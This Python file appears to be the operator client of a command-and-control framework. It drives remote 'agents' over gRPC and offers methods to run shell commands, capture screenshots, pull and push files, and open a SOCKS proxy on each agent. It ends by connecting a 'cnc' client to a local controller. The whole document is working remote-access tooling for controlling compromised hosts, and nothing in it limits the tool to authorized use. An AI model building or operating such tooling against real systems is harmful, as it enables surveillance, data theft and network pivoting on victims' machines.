from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Union

import grpc

import cmds_pb2
import cmds_pb2_grpc

_PRODUCTS_DIR_PATH = Path(__file__).parent / "products"


@dataclass
class Agent:
    id: int
    _stub: cmds_pb2_grpc.AgentManagerStub

    def echo(self, data: str) -> str:
        req = cmds_pb2.EchoCommandRequest(agent_id=self.id, data=data)
        resp = self._stub.RunEchoCommand(req)
        return resp.data

    def shell(self, cmd: str, decode: bool = True) -> bytes:
        req = cmds_pb2.ShellCommandRequest(agent_id=self.id, cmd=cmd)
        resp = self._stub.RunShellCommand(req)
        return resp.data.decode() if decode else resp.data

    def screenshot(self, local_path_to_save: str = None) -> None:
        req = cmds_pb2.ScreenshotRequest(agent_id=self.id)
        resp = self._stub.Screenshot(req)
        output_path = local_path_to_save or Path(
            _PRODUCTS_DIR_PATH, f'screenshot_agent_{self.id}_{datetime.now().isoformat()}.png')
        with open(output_path, 'wb') as screenshot_file:
            screenshot_file.write(resp.data)
        print(f'[*] Saved screenshot to {output_path}')

    def download_file(self, remote_path: str, local_path: str = None) -> Union[bytes, None]:
        req = cmds_pb2.DownloadFileRequest(agent_id=self.id, path=remote_path)
        resp = self._stub.DownloadFile(req)
        if local_path:
            with open(local_path, 'wb') as downloaded_file:
                downloaded_file.write(resp.data)
        else:
            return resp.data

    def upload_file(self, local_path: str, remote_path: str) -> None:
        with open(local_path, 'rb') as uploaded_file:
            data = uploaded_file.read()
        req = cmds_pb2.UploadFileRequest(
            agent_id=self.id, path=remote_path, data=data)
        self._stub.UploadFile(req)

    def start_socks_server(self) -> str:
        req = cmds_pb2.StartSocksServerRequest(agent_id=self.id)
        resp = self._stub.StartSocksServer(req)
        return resp.addr

    def stop_socks_server(self) -> str:
        req = cmds_pb2.StopSocksServerRequest(agent_id=self.id)
        resp = self._stub.StopSocksServer(req)

    def __repr__(self) -> str:
        return f'Agent(id={self.id})'


@dataclass
class ControllerClient:
    addr: str
    _stub: cmds_pb2_grpc.AgentManagerStub = None

    MAX_MSG_LEN = 100 * 1024 * 1024
    CHANNEL_OPTS = [
        ('grpc.max_send_message_length', MAX_MSG_LEN),
        ('grpc.max_receive_message_length', MAX_MSG_LEN),
    ]

    def connect(self) -> None:
        channel = grpc.insecure_channel(self.addr, options=self.CHANNEL_OPTS)
        self._stub = cmds_pb2_grpc.AgentManagerStub(channel)

    def get_agent(self, agent_id: int) -> Agent:
        return Agent(agent_id, self._stub)

    def get_agents(self, alive_only=False) -> [cmds_pb2.AgentInfo]:
        return self._stub.GetAgents(cmds_pb2.GetAgentsRequest(alive_only=alive_only))


if __name__ == '__main__':
    cnc = ControllerClient('localhost:8159')
    cnc.connect()
